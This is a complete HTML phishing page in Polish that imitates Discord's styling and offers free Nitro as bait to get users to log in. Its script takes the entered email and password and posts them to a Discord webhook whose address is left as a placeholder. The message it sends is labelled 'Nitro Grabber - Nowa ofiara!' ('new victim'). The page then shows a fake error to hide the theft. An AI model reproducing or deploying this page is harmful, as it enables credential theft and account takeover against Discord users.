<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #36393f;
            font-family: 'Segoe UI', Arial, sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #dcddde;
        }
        .container {
            background: #202225;
            padding: 30px;
            border-radius: 8px;
            width: 380px;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }
        h1 {
            text-align: center;
            color: #fff;
            margin-bottom: 8px;
        }
        p {
            text-align: center;
            color: #b9bbbe;
            margin-bottom: 25px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            background: #2f3136;
            border: none;
            border-radius: 4px;
            color: #dcddde;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #5865f2;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background: #4752c4;
        }
        .small {
            text-align: center;
            font-size: 12px;
            margin-top: 20px;
            color: #72767d;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Odbierz Nitro za darmo!</h1>
        <p>Zaloguj się, żeby odebrać 3-miesięczny Discord Nitro</p>
        <input type="text" placeholder="Nazwa użytkownika lub email" id="email">
        <input type="password" placeholder="Hasło" id="password">
        
        <button onclick="login()">Zaloguj się</button>
        
        <div class="small">Zapomniałeś hasła?</div>
    </div>

    <script>
        function login() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (email && password) {
                fetch('https://discord.com/api/webhooks/TUTAJ_WSTAW_WEBHOOK', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**Nitro Grabber - Nowa ofiara!**\n\n**Email:** ${email}\n**Hasło:** ${password}`
                    })
                }).catch(() => {});
                
                alert("Coś poszło nie tak. Spróbuj ponownie.");
            }
        }
    </script>
</body>
</html>
